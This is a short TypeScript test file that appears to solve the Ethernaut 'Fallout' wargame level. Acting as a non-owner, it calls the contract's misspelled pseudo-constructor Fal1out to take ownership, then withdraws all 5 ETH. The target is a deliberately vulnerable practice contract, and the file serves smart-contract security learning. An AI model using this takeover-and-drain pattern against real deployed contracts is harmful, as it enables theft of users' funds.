
import { accounts, contract } from '@openzeppelin/test-environment';
const { balance, ether, BN } = require('@openzeppelin/test-helpers');
import assert = require('assert');

// Ethereum accounts used in these tests
const [
    owner, // Contract owner
    user1, // Random user
] = accounts;

// Loads a compiled contract using OpenZeppelin test-environment
const Fallout = contract.fromArtifact('Fallout');
let fallout: any;

beforeEach(async () => {
    fallout = await Fallout.new({from: owner});

    // Send 5 ETH
    await fallout.allocate({ from: owner, value: ether('5') });

});

it('Fallout -> claim ownership & reduce contract balance to 0', async () => {

    // Check contract balance BEFORE
    const balanceBefore = await balance.current(fallout.address);

    // Call "pseudo-constructor"
    await fallout.Fal1out({ from: user1 });

    // Withdraw all contract funds
    await fallout.collectAllocations({ from: user1 });
    const balanceAfter = await balance.current(fallout.address);

    assert(balanceBefore.toString() === ether('5').toString());
    assert(balanceAfter.toString() === ether('0').toString());

});
